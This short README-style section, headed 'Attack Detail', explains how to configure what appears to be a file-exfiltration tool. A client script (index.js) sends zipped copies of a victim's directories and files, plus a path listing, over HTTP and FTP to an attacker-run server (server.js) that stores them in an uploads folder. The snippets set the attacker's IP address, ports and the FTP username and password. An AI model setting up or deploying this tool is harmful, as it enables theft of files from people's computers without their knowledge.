## Attack Detail


Files following will appear in the 'uploads' within the same directory with server.js:  
path.txt  
dirs_back.zip  
files_back.zip  

index.js:

1) Modify to IP address of the PC runs server.js.  
	hostname: "127.0.0.1",    
	port: "8000",  


2) Modify to IP address of the PC runs server.js  
	const host = "127.0.0.1";  
	const port = 21;  
	const user = "ftpuser";    
	const password = "12345678";  
	const remotePath = "/";	
	

server.js:

1)  Change to IP address and port number of the PC runs server.js.  
	url: "ftp://127.0.0.1:21",  
	anonymous: false,  
	pasv_url: "127.0.0.1",  


2)  Change FTP user and FTP password.  
	if (username === 'ftpuser' && password === '12345678') {

3) Modify IP address and port number.  
     const httpPort = 8000;  
	server.listen(httpPort, () => {  
	console.log(`HTTP Server listening on http://127.0.0.1:${httpPort}`);  


